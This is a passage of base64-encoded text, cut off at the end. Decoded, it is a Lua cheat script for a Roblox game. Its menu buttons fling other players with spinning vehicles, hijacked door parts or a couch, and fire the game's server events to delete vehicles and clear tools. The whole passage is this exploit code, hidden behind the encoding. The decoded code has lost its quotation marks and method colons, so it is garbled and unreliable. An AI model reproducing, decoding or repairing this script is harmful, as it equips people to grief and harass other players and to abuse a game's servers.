bG9jYWwgVGFyZ2V0QyA9IFRhcmdldFBsYXllci5DaGFyYWN0ZXIKICAgICAgICBsb2NhbCBUYXJnZXRIID0gVGFyZ2V0Q0ZpbmRGaXJzdENoaWxkT2ZDbGFzcyhIdW1hbm9pZCkKICAgICAgICBsb2NhbCBUYXJnZXRSUCA9IFRhcmdldENGaW5kRmlyc3RDaGlsZChIdW1hbm9pZFJvb3RQYXJ0KQoKICAgICAgICBpZiBub3QgVGFyZ2V0UlAgb3Igbm90IFRhcmdldEggdGhlbgogICAgICAgICAgICB3YXJuKFRhcmdldCdzIEh1bWFub2lkIG9yIFJvb3RQYXJ0IG5vdCBmb3VuZCkKICAgICAgICAgICAgcmV0dXJuCiAgICAgICAgZW5kCgogICAgICAgIGxvY2FsIFNwaW4gPSBJbnN0YW5jZS5uZXcoQm9keUFuZ3VsYXJWZWxvY2l0eSkKICAgICAgICBTcGluLk5hbWUgPSBTcGlubmluZwogICAgICAgIFNwaW4uUGFyZW50ID0gUENhci5QcmltYXJ5UGFydAogICAgICAgIFNwaW4uTWF4VG9ycXVlID0gVmVjdG9yMy5uZXcoMCwgbWF0aC5odWdlLCAwKQogICAgICAgIFNwaW4uQW5ndWxhclZlbG9jaXR5ID0gVmVjdG9yMy5uZXcoMCwgMzY5LCAwKSAKCiAgICAgICAgcHJpbnQoRmxpbmcgYWN0aXZlISkKCiAgICAgICAgbG9jYWwgZnVuY3Rpb24gbW92ZUNhcihUYXJnZXRSUCwgb2Zmc2V0KQogICAgICAgICAgICBpZiBQQ2FyIGFuZCBQQ2FyLlByaW1hcnlQYXJ0IHRoZW4KICAgICAgICAgICAgICAgIFBDYXJTZXRQcmltYXJ5UGFydENGcmFtZShDRnJhbWUubmV3KFRhcmdldFJQLlBvc2l0aW9uICsgb2Zmc2V0KSkKICAgICAgICAgICAgZW5kCiAgICAgICAgZW5kCgogICAgICAgIHRhc2suc3Bhd24oZnVuY3Rpb24oKQogICAgICAgICAgICB3aGlsZSBQQ2FyIGFuZCBQQ2FyLlBhcmVudCBhbmQgVGFyZ2V0UlAgYW5kIFRhcmdldFJQLlBhcmVudCBkbwogICAgICAgICAgICAgICAgdGFzay53YWl0KDAuMDEpIAogICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICBtb3ZlQ2FyKFRhcmdldFJQLCBWZWN0b3IzLm5ldygwLCAxLCAwKSkgIAogICAgICAgICAgICAgICAgbW92ZUNhcihUYXJnZXRSUCwgVmVjdG9yMy5uZXcoMCwgLTIuMjUsIDUpKSAgCiAgICAgICAgICAgICAgICBtb3ZlQ2FyKFRhcmdldFJQLCBWZWN0b3IzLm5ldygwLCAyLjI1LCAwLjI1KSkgIAogICAgICAgICAgICAgICAgbW92ZUNhcihUYXJnZXRSUCwgVmVjdG9yMy5uZXcoLTIuMjUsIC0xLjUsIDIuMjUpKSAgCiAgICAgICAgICAgICAgICBtb3ZlQ2FyKFRhcmdldFJQLCBWZWN0b3IzLm5ldygwLCAxLjUsIDApKSAgCiAgICAgICAgICAgICAgICBtb3ZlQ2FyKFRhcmdldFJQLCBWZWN0b3IzLm5ldygwLCAtMS41LCAwKSkgIAoKICAgICAgICAgICAgICAgIGlmIFBDYXIgYW5kIFBDYXIuUHJpbWFyeVBhcnQgdGhlbgogICAgICAgICAgICAgICAgICAgIGxvY2FsIFJvdGF0aW9uID0gQ0ZyYW1lLkFuZ2xlcygKICAgICAgICAgICAgICAgICAgICAgICAgbWF0aC5yYWQobWF0aC5yYW5kb20oLTM2OSwgMzY5KSksICAKICAgICAgICAgICAgICAgICAgICAgICAgbWF0aC5yYWQobWF0aC5yYW5kb20oLTM2OSwgMzY5KSksIAogICAgICAgICAgICAgICAgICAgICAgICBtYXRoLnJhZChtYXRoLnJhbmRvbSgtMzY5LCAzNjkpKQogICAgICAgICAgICAgICAgICAgICkKICAgICAgICAgICAgICAgICAgICBQQ2FyU2V0UHJpbWFyeVBhcnRDRnJhbWUoQ0ZyYW1lLm5ldyhUYXJnZXRSUC5Qb3NpdGlvbiArIFZlY3RvcjMubmV3KDAsIDEuNSwgMCkpICBSb3RhdGlvbikKICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICBlbmQKCiAgICAgICAgICAgIGlmIFNwaW4gYW5kIFNwaW4uUGFyZW50IHRoZW4KICAgICAgICAgICAgICAgIFNwaW5EZXN0cm95KCkKICAgICAgICAgICAgICAgIHByaW50KEZsaW5nIGRlYWN0aXZhdGVkKQogICAgICAgICAgICBlbmQKICAgICAgICBlbmQpCiAgICBlbmQKfSkKcHJpbnQoRmxpbmcgLSBCb2F0IGJ1dHRvbiBjcmVhdGVkKQoKVHJvbGxBZGRCdXR0b24oewogICAgTmFtZSA9IFR1cm4gT2ZmIEZsaW5nIC0gQm9hdCwKICAgIENhbGxiYWNrID0gZnVuY3Rpb24oKQogICAgICAgIGxvY2FsIFBsYXllciA9IGdhbWUuUGxheWVycy5Mb2NhbFBsYXllcgogICAgICAgIGxvY2FsIENoYXJhY3RlciA9IFBsYXllci5DaGFyYWN0ZXIKICAgICAgICBsb2NhbCBSb290UGFydCA9IENoYXJhY3RlciBhbmQgQ2hhcmFjdGVyRmluZEZpcnN0Q2hpbGQoSHVtYW5vaWRSb290UGFydCkKICAgICAgICBsb2NhbCBIdW1hbm9pZCA9IENoYXJhY3RlciBhbmQgQ2hhcmFjdGVyRmluZEZpcnN0Q2hpbGRPZkNsYXNzKEh1bWFub2lkKQogICAgICAgIGxvY2FsIFZlaGljbGVzID0gZ2FtZS5Xb3Jrc3BhY2VGaW5kRmlyc3RDaGlsZChWZWhpY2xlcykKCiAgICAgICAgaWYgbm90IFJvb3RQYXJ0IG9yIG5vdCBIdW1hbm9pZCB0aGVuCiAgICAgICAgICAgIHdhcm4oTm8gUm9vdFBhcnQgb3IgSHVtYW5vaWQgZm91bmQhKQogICAgICAgICAgICByZXR1cm4KICAgICAgICBlbmQKCiAgICAgICAgSHVtYW5vaWQuUGxhdGZvcm1TdGFuZCA9IHRydWUKICAgICAgICBwcmludChQbGF5ZXIgZnJvemVuIHRvIHJlZHVjZSBzcGluIGVmZmVjdHMuKQoKICAgICAgICBmb3IgXywgb2JqIGluIHBhaXJzKFJvb3RQYXJ0R2V0Q2hpbGRyZW4oKSkgZG8KICAgICAgICAgICAgaWYgb2JqSXNBKEJvZHlBbmd1bGFyVmVsb2NpdHkpIG9yIG9iaklzQShCb2R5VmVsb2NpdHkpIHRoZW4KICAgICAgICAgICAgICAgIG9iakRlc3Ryb3koKQogICAgICAgICAgICBlbmQKICAgICAgICBlbmQKICAgICAgICBwcmludChTcGluIGFuZCBmb3JjZXMgcmVtb3ZlZCBmcm9tIHBsYXllci4pCgogICAgICAgIGdhbWVHZXRTZXJ2aWNlKFJlcGxpY2F0ZWRTdG9yYWdlKS5SRUZpbmRGaXJzdENoaWxkKDFDYTFyKUZpcmVTZXJ2ZXIoRGVsZXRlQWxsVmVoaWNsZXMpCiAgICAgICAgdGFzay53YWl0KDAuNSkKCiAgICAgICAgbG9jYWwgUENhciA9IFZlaGljbGVzIGFuZCBWZWhpY2xlc0ZpbmRGaXJzdENoaWxkKFBsYXllci5OYW1lLi5DYXIpCiAgICAgICAgaWYgUENhciBhbmQgUENhci5QcmltYXJ5UGFydCB0aGVuCiAgICAgICAgICAgIGZvciBfLCBvYmogaW4gcGFpcnMoUENhci5QcmltYXJ5UGFydEdldENoaWxkcmVuKCkpIGRvCiAgICAgICAgICAgICAgICBpZiBvYmpJc0EoQm9keUFuZ3VsYXJWZWxvY2l0eSkgb3Igb2JqSXNBKEJvZHlWZWxvY2l0eSkgdGhlbgogICAgICAgICAgICAgICAgICAgIG9iakRlc3Ryb3koKQogICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgIGVuZAogICAgICAgICAgICBwcmludChTcGluIHJlbW92ZWQgZnJvbSBib2F0LikKICAgICAgICBlbmQKCiAgICAgICAgdGFzay53YWl0KDEpCgogICAgICAgIGxvY2FsIHNhZmVQb3MgPSBWZWN0b3IzLm5ldygwLCAxMDAwLCAwKQogICAgICAgIGxvY2FsIGJwID0gSW5zdGFuY2UubmV3KEJvZHlQb3NpdGlvbiwgUm9vdFBhcnQpCiAgICAgICAgYnAuUG9zaXRpb24gPSBzYWZlUG9zCiAgICAgICAgYnAuTWF4Rm9yY2UgPSBWZWN0b3IzLm5ldyhtYXRoLmh1Z2UsIG1hdGguaHVnZSwgbWF0aC5odWdlKQoKICAgICAgICBsb2NhbCBiZyA9IEluc3RhbmNlLm5ldyhCb2R5R3lybywgUm9vdFBhcnQpCiAgICAgICAgYmcuQ0ZyYW1lID0gUm9vdFBhcnQuQ0ZyYW1lCiAgICAgICAgYmcuTWF4VG9ycXVlID0gVmVjdG9yMy5uZXcobWF0aC5odWdlLCBtYXRoLmh1Z2UsIG1hdGguaHVnZSkKCiAgICAgICAgcHJpbnQoUGxheWVyIGlzIGxvY2tlZCBhdCBhIHNhZmUgY29vcmRpbmF0ZS4pCgogICAgICAgIHRhc2sud2FpdCgzKQoKICAgICAgICBicERlc3Ryb3koKQogICAgICAgIGJnRGVzdHJveSgpCiAgICAgICAgSHVtYW5vaWQuUGxhdGZvcm1TdGFuZCA9IGZhbHNlCgogICAgICAgIHByaW50KFBsYXllciByZWxlYXNlZCwgc2FmZSBhdCBwb3NpdGlvbi4pCiAgICBlbmQKfSkKCmxvY2FsIGtpbGwgPSBUcm9sbEFkZFNlY3Rpb24oe05hbWUgPSBDbGljayBLaWxsIE1ldGhvZHN9KQoKVHJvbGxBZGRCdXR0b24oewogIE5hbWUgPSBDbGljayBGbGluZyBEb29ycyBbQmV0YV0sCkRlc2NyaXB0aW9uID0gVG8gdXNlLCBpdCdzIHJlY29tbWVuZGVkIHRvIGdldCBjbG9zZSB0byBvdGhlciBkb29ycy4gQWZ0ZXIgdGhleSBjb21lIHRvIHlvdSwgY2xpY2sgb24gdGhlIHBsYXllciB5b3Ugd2FudCB0byBmbGluZywKICBDYWxsYmFjayA9IGZ1bmN0aW9uKCkKbG9jYWwgUGxheWVycyA9IGdhbWVHZXRTZXJ2aWNlKFBsYXllcnMpCmxvY2FsIFdvcmtzcGFjZSA9IGdhbWVHZXRTZXJ2aWNlKFdvcmtzcGFjZSkKbG9jYWwgUnVuU2VydmljZSA9IGdhbWVHZXRTZXJ2aWNlKFJ1blNlcnZpY2UpCmxvY2FsIFVzZXJJbnB1dFNlcnZpY2UgPSBnYW1lR2V0U2VydmljZShVc2VySW5wdXRTZXJ2aWNlKQoKbG9jYWwgTG9jYWxQbGF5ZXIgPSBQbGF5ZXJzLkxvY2FsUGxheWVyCmxvY2FsIENoYXJhY3RlciA9IExvY2FsUGxheWVyLkNoYXJhY3RlciBvciBMb2NhbFBsYXllci5DaGFyYWN0ZXJBZGRlZFdhaXQoKQpsb2NhbCBIUlAgPSBDaGFyYWN0ZXJXYWl0Rm9yQ2hpbGQoSHVtYW5vaWRSb290UGFydCkKCi0tIEludmlzaWJsZSB0YXJnZXQgKEJsYWNrSG9sZSkKbG9jYWwgQmxhY2tIb2xlID0gSW5zdGFuY2UubmV3KFBhcnQpCkJsYWNrSG9sZS5TaXplID0gVmVjdG9yMy5uZXcoMTAwMDAwLCAxMDAwMDAsIDEwMDAwMCkKQmxhY2tIb2xlLlRyYW5zcGFyZW5jeSA9IDEKQmxhY2tIb2xlLkFuY2hvcmVkID0gdHJ1ZQpCbGFja0hvbGUuQ2FuQ29sbGlkZSA9IGZhbHNlCkJsYWNrSG9sZS5OYW1lID0gQmxhY2tIb2xlVGFyZ2V0CkJsYWNrSG9sZS5QYXJlbnQgPSBXb3Jrc3BhY2UKCi0tIEJhc2UgYXR0YWNobWVudCBvbiB0aGUgQmxhY2tIb2xlCmxvY2FsIGJhc2VBdHRhY2htZW50ID0gSW5zdGFuY2UubmV3KEF0dGFjaG1lbnQpCmJhc2VBdHRhY2htZW50Lk5hbWUgPSBMdXNjYWFfQmxhY2tIb2xlQXR0YWNobWVudApiYXNlQXR0YWNobWVudC5QYXJlbnQgPSBCbGFja0hvbGUKCi0tIFVwZGF0ZSBCbGFja0hvbGUgcG9zaXRpb24KUnVuU2VydmljZS5IZWFydGJlYXRDb25uZWN0KGZ1bmN0aW9uKCkKCUJsYWNrSG9sZS5DRnJhbWUgPSBIUlAuQ0ZyYW1lCmVuZCkKCi0tIExpc3Qgb2YgY29udHJvbGxlZCBkb29ycwpsb2NhbCBDb250cm9sbGVkRG9vcnMgPSB7fQoKLS0gUHJlcGFyZSBhIGRvb3IgdG8gYmUgY29udHJvbGxlZApsb2NhbCBmdW5jdGlvbiBTZXR1cFBhcnQocGFydCkKCWlmIG5vdCBwYXJ0SXNBKEJhc2VQYXJ0KSBvciBwYXJ0LkFuY2hvcmVkIG9yIG5vdCBzdHJpbmcuZmluZChwYXJ0Lk5hbWUsIERvb3IpIHRoZW4gcmV0dXJuIGVuZAoJaWYgcGFydEZpbmRGaXJzdENoaWxkKEx1c2NhYV9BdHRhY2hlZCkgdGhlbiByZXR1cm4gZW5kCgoJcGFydC5DYW5Db2xsaWRlID0gZmFsc2UKCglmb3IgXywgb2JqIGluIGlwYWlycyhwYXJ0R2V0Q2hpbGRyZW4oKSkgZG8KCQlpZiBvYmpJc0EoQWxpZ25Qb3NpdGlvbikgb3Igb2JqSXNBKFRvcnF1ZSkgb3Igb2JqSXNBKEF0dGFjaG1lbnQpIHRoZW4KCQkJb2JqRGVzdHJveSgpCgkJZW5kCgllbmQKCglsb2NhbCBtYXJrZXIgPSBJbnN0YW5jZS5uZXcoQm9vbFZhbHVlLCBwYXJ0KQoJbWFya2VyLk5hbWUgPSBMdXNjYWFfQXR0YWNoZWQKCglsb2NhbCBhMSA9IEluc3RhbmNlLm5ldyhBdHRhY2htZW50LCBwYXJ0KQoKCWxvY2FsIGFsaWduID0gSW5zdGFuY2UubmV3KEFsaWduUG9zaXRpb24sIHBhcnQpCglhbGlnbi5BdHRhY2htZW50MCA9IGExCglhbGlnbi5BdHRhY2htZW50MSA9IGJhc2VBdHRhY2htZW50CglhbGlnbi5NYXhGb3JjZSA9IDFlMjAKCWFsaWduLk1heFZlbG9jaXR5ID0gbWF0aC5odWdlCglhbGlnbi5SZXNwb25zaXZlbmVzcyA9IDk5OTk5CgoJbG9jYWwgdG9ycXVlID0gSW5zdGFuY2UubmV3KFRvcnF1ZSwgcGFydCkKCXRvcnF1ZS5BdHRhY2htZW50MCA9IGExCgl0b3JxdWUuUmVsYXRpdmVUbyA9IEVudW0uQWN0dWF0b3JSZWxhdGl2ZVRvLldvcmxkCgl0b3JxdWUuVG9ycXVlID0gVmVjdG9yMy5uZXcoCgkJbWF0aC5yYW5kb20oLTEwZTUsIDEwZTUpICAxMDAwMCwKCQltYXRoLnJhbmRvbSgtMTBlNSwgMTBlNSkgIDEwMDAwLAoJCW1hdGgucmFuZG9tKC0xMGU1LCAxMGU1KSAgMTAwMDAKCSkKCgl0YWJsZS5pbnNlcnQoQ29udHJvbGxlZERvb3JzLCB7UGFydCA9IHBhcnQsIEFsaWduID0gYWxpZ259KQplbmQKCi0tIERldGVjdCBhbmQgcHJlcGFyZSBleGlzdGluZyBkb29ycwpmb3IgXywgb2JqIGluIGlwYWlycyhXb3Jrc3BhY2VHZXREZXNjZW5kYW50cygpKSBkbwoJaWYgb2JqSXNBKEJhc2VQYXJ0KSBhbmQgc3RyaW5nLmZpbmQob2JqLk5hbWUsIERvb3IpIHRoZW4KCQlTZXR1cFBhcnQob2JqKQoJZW5kCmVuZAoKLS0gTmV3IGRvb3JzIGluIHRoZSBmdXR1cmUKV29ya3NwYWNlLkRlc2NlbmRhbnRBZGRlZENvbm5lY3QoZnVuY3Rpb24ob2JqKQoJaWYgb2JqSXNBKEJhc2VQYXJ0KSBhbmQgc3RyaW5nLmZpbmQob2JqLk5hbWUsIERvb3IpIHRoZW4KCQlTZXR1cFBhcnQob2JqKQoJZW5kCmVuZCkKCi0tIEZsaW5nIHBsYXllciB3aXRoIHRpbWVvdXQgYW5kIHJldHVybgpsb2NhbCBmdW5jdGlvbiBGbGluZ1BsYXllcihwbGF5ZXIpCglsb2NhbCBjaGFyID0gcGxheWVyLkNoYXJhY3RlcgoJaWYgbm90IGNoYXIgdGhlbiByZXR1cm4gZW5kCglsb2NhbCB0YXJnZXRIUlAgPSBjaGFyRmluZEZpcnN0Q2hpbGQoSHVtYW5vaWRSb290UGFydCkKCWlmIG5vdCB0YXJnZXRIUlAgdGhlbiByZXR1cm4gZW5kCgoJbG9jYWwgdGFyZ2V0QXR0YWNobWVudCA9IHRhcmdldEhSUEZpbmRGaXJzdENoaWxkKFNITk1BWF9UYXJnZXRBdHRhY2htZW50KQoJaWYgbm90IHRhcmdldEF0dGFjaG1lbnQgdGhlbgoJCXRhcmdldEF0dGFjaG1lbnQgPSBJbnN0YW5jZS5uZXcoQXR0YWNobWVudCwgdGFyZ2V0SFJQKQoJCXRhcmdldEF0dGFjaG1lbnQuTmFtZSA9IFNITk1BWF9UYXJnZXRBdHRhY2htZW50CgllbmQKCglmb3IgXywgZGF0YSBpbiBpcGFpcnMoQ29udHJvbGxlZERvb3JzKSBkbwoJCWlmIGRhdGEuQWxpZ24gdGhlbgoJCQlkYXRhLkFsaWduLkF0dGFjaG1lbnQxID0gdGFyZ2V0QXR0YWNobWVudAoJCWVuZAoJZW5kCgoJbG9jYWwgc3RhcnQgPSB0aWNrKCkKCWxvY2FsIGZsaW5nRGV0ZWN0ZWQgPSBmYWxzZQoKCXdoaWxlIHRpY2soKSAtIHN0YXJ0ICA1IGRvCgkJaWYgdGFyZ2V0SFJQLlZlbG9jaXR5Lk1hZ25pdHVkZSA9IDIwIHRoZW4KCQkJZmxpbmdEZXRlY3RlZCA9IHRydWUKCQkJYnJlYWsKCQllbmQKCQlSdW5TZXJ2aWNlLkhlYXJ0YmVhdFdhaXQoKQoJZW5kCgoJLS0gQWx3YXlzIHJldHVybiB0aGUgZG9vcnMKCWZvciBfLCBkYXRhIGluIGlwYWlycyhDb250cm9sbGVkRG9vcnMpIGRvCgkJaWYgZGF0YS5BbGlnbiB0aGVuCgkJCWRhdGEuQWxpZ24uQXR0YWNobWVudDEgPSBiYXNlQXR0YWNobWVudAoJCWVuZAoJZW5kCmVuZAoKLS0gQ2xpY2sgKHdvcmtzIG9uIG1vYmlsZSkKVXNlcklucHV0U2VydmljZS5Ub3VjaFRhcENvbm5lY3QoZnVuY3Rpb24odG91Y2hQb3NpdGlvbnMsIHByb2Nlc3NlZCkKCWlmIHByb2Nlc3NlZCB0aGVuIHJldHVybiBlbmQKCWxvY2FsIHBvcyA9IHRvdWNoUG9zaXRpb25zWzFdCglsb2NhbCBjYW1lcmEgPSBXb3Jrc3BhY2UuQ3VycmVudENhbWVyYQoJbG9jYWwgdW5pdFJheSA9IGNhbWVyYVNjcmVlblBvaW50VG9SYXkocG9zLlgsIHBvcy5ZKQoJbG9jYWwgcmF5Y2FzdCA9IFdvcmtzcGFjZVJheWNhc3QodW5pdFJheS5PcmlnaW4sIHVuaXRSYXkuRGlyZWN0aW9uICAxMDAwKQoKCWlmIHJheWNhc3QgYW5kIHJheWNhc3QuSW5zdGFuY2UgdGhlbgoJCWxvY2FsIGhpdCA9IHJheWNhc3QuSW5zdGFuY2UKCQlsb2NhbCBwbGF5ZXIgPSBQbGF5ZXJzR2V0UGxheWVyRnJvbUNoYXJhY3RlcihoaXRGaW5kRmlyc3RBbmNlc3Rvck9mQ2xhc3MoTW9kZWwpKQoJCWlmIHBsYXllciBhbmQgcGxheWVyIH49IExvY2FsUGxheWVyIHRoZW4KCQkJRmxpbmdQbGF5ZXIocGxheWVyKQoJCWVuZAoJZW5kCmVuZCkKICBlbmQKfSkKCgpUcm9sbEFkZEJ1dHRvbih7CiAgICBOYW1lID0gQ2xpY2sgRmxpbmcgQ291Y2ggKFRvb2wpLAogICAgQ2FsbGJhY2sgPSBmdW5jdGlvbigpCgpsb2NhbCBwbGF5ZXJzID0gZ2FtZUdldFNlcnZpY2UoUGxheWVycykKbG9jYWwgcmVwbGljYXRlZFN0b3JhZ2UgPSBnYW1lR2V0U2VydmljZShSZXBsaWNhdGVkU3RvcmFnZSkKbG9jYWwgdXNlcklucHV0ID0gZ2FtZUdldFNlcnZpY2UoVXNlcklucHV0U2VydmljZSkKbG9jYWwgbG9jYWxQbGF5ZXIgPSBwbGF5ZXJzLkxvY2FsUGxheWVyCmxvY2FsIGNhbWVyYSA9IHdvcmtzcGFjZS5DdXJyZW50Q2FtZXJhCgpsb2NhbCBjYW5DbGljayA9IHRydWUKbG9jYWwgdG9vbEVxdWlwcGVkID0gZmFsc2UKbG9jYWwgVE9PTF9OQU1FID0gQ2xpY2sgRmxpbmcgQ291Y2gKCmxvY2FsIGJhY2twYWNrID0gbG9jYWxQbGF5ZXJXYWl0Rm9yQ2hpbGQoQmFja3BhY2spCgppZiBub3QgYmFja3BhY2tGaW5kRmlyc3RDaGlsZChUT09MX05BTUUpIGFuZCBub3QgKGxvY2FsUGxheWVyLkNoYXJhY3RlciBhbmQgbG9jYWxQbGF5ZXIuQ2hhcmFjdGVyRmluZEZpcnN0Q2hpbGQoVE9PTF9OQU1FKSkgdGhlbgoJbG9jYWwgdG9vbCA9IEluc3RhbmNlLm5ldyhUb29sKQoJdG9vbC5OYW1lID0gVE9PTF9OQU1FCgl0b29sLlJlcXVpcmVzSGFuZGxlID0gZmFsc2UKCXRvb2wuQ2FuQmVEcm9wcGVkID0gZmFsc2UKCgl0b29sLkVxdWlwcGVkQ29ubmVjdChmdW5jdGlvbigpCgkJdG9vbEVxdWlwcGVkID0gdHJ1ZQoJZW5kKQoKCXRvb2wuVW5lcXVpcHBlZENvbm5lY3QoZnVuY3Rpb24oKQoJCXRvb2xFcXVpcHBlZCA9IGZhbHNlCgllbmQpCgoJdG9vbC5QYXJlbnQgPSBiYWNrcGFjawplbmQKCmxvY2FsIGZ1bmN0aW9uIGZsaW5nV2l0aENvdWNoKHRhcmdldCkKCWlmIG5vdCB0b29sRXF1aXBwZWQgdGhlbiByZXR1cm4gZW5kCglpZiBub3QgdGFyZ2V0IG9yIG5vdCB0YXJnZXQuQ2hhcmFjdGVyIG9yIHRhcmdldCA9PSBsb2NhbFBsYXllciB0aGVuIHJldHVybiBlbmQKCglsb2NhbCBpc0ZsaW5naW5nID0gdHJ1ZQoJbG9jYWwgcm9vdFBhcnQgPSBsb2NhbFBsYXllci5DaGFyYWN0ZXIgYW5kIGxvY2FsUGxheWVyLkNoYXJhY3RlckZpbmRGaXJzdENoaWxkKEh1bWFub2lkUm9vdFBhcnQpCglsb2NhbCB0YXJnZXRSb290UGFydCA9IHRhcmdldC5DaGFyYWN0ZXIgYW5kIHRhcmdldC5DaGFyYWN0ZXJGaW5kRmlyc3RDaGlsZChIdW1hbm9pZFJvb3RQYXJ0KQoJaWYgbm90IHJvb3RQYXJ0IG9yIG5vdCB0YXJnZXRSb290UGFydCB0aGVuIHJldHVybiBlbmQKCglsb2NhbCBjaGFyYWN0ZXIgPSBsb2NhbFBsYXllci5DaGFyYWN0ZXIKCWxvY2FsIGh1bWFub2lkID0gY2hhcmFjdGVyRmluZEZpcnN0Q2hpbGRPZkNsYXNzKEh1bWFub2lkKQoJbG9jYWwgb3JpZ2luYWxDRnJhbWUgPSByb290UGFydC5DRnJhbWUKCglyZXBsaWNhdGVkU3RvcmFnZVdhaXRGb3JDaGlsZChSRSlXYWl0Rm9yQ2hpbGQoMUNsZWExclRvb2wxcylGaXJlU2VydmVyKENsZWFyQWxsVG9vbHMpCgl0YXNrLndhaXQoMC4yKQoKCXJlcGxpY2F0ZWRTdG9yYWdlLlJFRmluZEZpcnN0Q2hpbGQoMVRvbzFsKUludm9rZVNlcnZlcihQaWNraW5nVG9vbHMsIENvdWNoKQoJdGFzay53YWl0KDAuMykKCglsb2NhbCBjb3VjaCA9IGxvY2FsUGxheWVyLkJhY2twYWNrRmluZEZpcnN0Q2hpbGQoQ291Y2gpCglpZiBjb3VjaCB0aGVuCgkJY291Y2guUGFyZW50ID0gY2hhcmFjdGVyCgllbmQKCXRhc2sud2FpdCgwLjEpCgoJZ2FtZUdldFNlcnZpY2UoVmlydHVhbElucHV0TWFuYWdlcilTZW5kS2V5RXZlbnQodHJ1ZSwgRW51bS5LZXlDb2RlLkYsIGZhbHNlLCBnYW1lKQoJdGFzay53YWl0KDAuMjUpCgoJd29ya3NwYWNlLkZhbGxlblBhcnRzRGVzdHJveUhlaWdodCA9IDAwCgoJbG9jYWwgZm9yY2UgPSBJbnN0YW5jZS5uZXcoQm9keVZlbG9jaXR5KQoJZm9yY2UuTmFtZSA9IEZsaW5nRm9yY2UKCWZvcmNlLlZlbG9jaXR5ID0gVmVjdG9yMy5uZXcoOWU4LCA5ZTgsIDllOCkKCWZvcmNlLk1heEZvcmNlID0gVmVjdG9yMy5uZXcobWF0aC5odWdlLCBtYXRoLmh1Z2UsIG1hdGguaHVnZSkKCWZvcmNlLlBhcmVudCA9IHJvb3RQYXJ0CgoJaHVtYW5vaWRTZXRTdGF0ZUVuYWJsZWQoRW51bS5IdW1hbm9pZFN0YXRlVHlwZS5TZWF0ZWQsIGZhbHNlKQoJaHVtYW5vaWQuUGxhdGZvcm1TdGFuZCA9IGZhbHNlCgljYW1lcmEuQ2FtZXJhU3ViamVjdCA9IHRhcmdldC5DaGFyYWN0ZXJGaW5kRmlyc3RDaGlsZChIZWFkKSBvciB0YXJnZXRSb290UGFydCBvciBodW1hbm9pZAoKCXRhc2suc3Bhd24oZnVuY3Rpb24oKQoJCWxvY2FsIGFuZ2xlID0gMAoJCWxvY2FsIHBhcnRzID0ge3Jvb3RQYXJ0fQoJCXdoaWxlIGlzRmxpbmdpbmcgYW5kIHRhcmdldCBhbmQgdGFyZ2V0LkNoYXJhY3RlciBhbmQgdGFyZ2V0LkNoYXJhY3RlckZpbmRGaXJzdENoaWxkT2ZDbGFzcyhIdW1hbm9pZCkgZG8KCQkJbG9jYWwgdGFyZ2V0SHVtYW5vaWQgPSB0YXJnZXQuQ2hhcmFjdGVyRmluZEZpcnN0Q2hpbGRPZkNsYXNzKEh1bWFub2lkKQoJCQlpZiB0YXJnZXRIdW1hbm9pZC5TaXQgdGhlbiBicmVhayBlbmQKCQkJYW5nbGUgKz0gNTAKCgkJCWZvciBfLCBwYXJ0IGluIGlwYWlycyhwYXJ0cykgZG8KCQkJCWxvY2FsIGhycCA9IHRhcmdldC5DaGFyYWN0ZXIuSHVtYW5vaWRSb290UGFydAoJCQkJbG9jYWwgcG9zID0gaHJwLlBvc2l0aW9uICsgaHJwLlZlbG9jaXR5ICAxLjUKCQkJCXJvb3RQYXJ0LkNGcmFtZSA9IENGcmFtZS5uZXcocG9zKSAgQ0ZyYW1lLkFuZ2xlcyhtYXRoLnJhZChhbmdsZSksIDAsIDApCgkJCWVuZAoKCQkJcm9vdFBhcnQuVmVsb2NpdHkgPSBWZWN0b3IzLm5ldyg5ZTgsIDllOCwgOWU4KQoJCQlyb290UGFydC5Sb3RWZWxvY2l0eSA9IFZlY3RvcjMubmV3KDllOCwgOWU4LCA5ZTgpCgkJCXRhc2sud2FpdCgpCgkJZW5kCgoJCWlzRmxpbmdpbmcgPSBmYWxzZQoJCWZvcmNlRGVzdHJveSgpCgkJaHVtYW5vaWRTZXRTdGF0ZUVuYWJsZWQoRW51bS5IdW1hbm9pZFN0YXRlVHlwZS5TZWF0ZWQsIHRydWUpCgkJaHVtYW5vaWQuUGxhdGZvcm1TdGFuZCA9IGZhbHNlCgkJcm9vdFBhcnQuQ0ZyYW1lID0gb3JpZ2luYWxDRnJhbWUKCQljYW1lcmEuQ2FtZXJhU3ViamVjdCA9IGh1bWFub2lkCgoJCWZvciBfLCBwIGluIHBhaXJzKGNoYXJhY3RlckdldERlc2NlbmRhbnRzKCkpIGRvCgkJCWlmIHBJc0EoQmFzZVBhcnQpIHRoZW4KCQkJCXAuVmVsb2NpdHkgPSBWZWN0b3IzLnplcm8KCQkJCXAuUm90VmVsb2NpdHkgPSBWZWN0b3IzLnplcm8KCQkJZW5kCgkJZW5kCgoJCWh1bWFub2lkVW5lcXVpcFRvb2xzKCkKCQlyZXBsaWNhdGVkU3RvcmFnZS5SRUZpbmRGaXJzdENoaWxkKDFUb28xbClJbnZva2VTZXJ2ZXIoUGlja2luZ1Rvb2xzLCBDb3VjaCkKCWVuZCkKCgl3aGlsZSBpc0ZsaW5naW5nIGRvCgkJdGFzay53YWl0KCkKCWVuZAplbmQKCnVzZXJJbnB1dC5Ub3VjaFRhcENvbm5lY3QoZnVuY3Rpb24odG91Y2hlcywgcHJvY2Vzc2VkKQoJaWYgcHJvY2Vzc2VkIG9yIG5vdCBjYW5DbGljayBvciBub3QgdG9vbEVxdWlwcGVkIHRoZW4gcmV0dXJuIGVuZAoKCWxvY2FsIHBvcyA9IHRvdWNoZXNbMV0KCWxvY2FsIHJheSA9IGNhbWVyYVNjcmVlblBvaW50VG9SYXkocG9zLlgsIHBvcy5ZKQoJbG9jYWwgaGl0UmVzdWx0ID0gd29ya3NwYWNlUmF5Y2FzdChyYXkuT3JpZ2luLCByYXkuRGlyZWN0aW9uICAxMDAwKQoKCWlmIGhpdFJlc3VsdCBhbmQgaGl0UmVzdWx0Lkluc3RhbmNlIHRoZW4KCQlsb2NhbCB0YXJnZXQgPSBwbGF5ZXJzR2V0UGxheWVyRnJvbUNoYXJhY3RlcihoaXRSZXN1bHQuSW5zdGFuY2VGaW5kRmlyc3RBbmNlc3Rvck9mQ2xhc3MoTW9kZWwpKQoJCWlmIHRhcmdldCBhbmQgdGFyZ2V0IH49IGxvY2FsUGxheWVyIHRoZW4KCQkJY2FuQ2xpY2sgP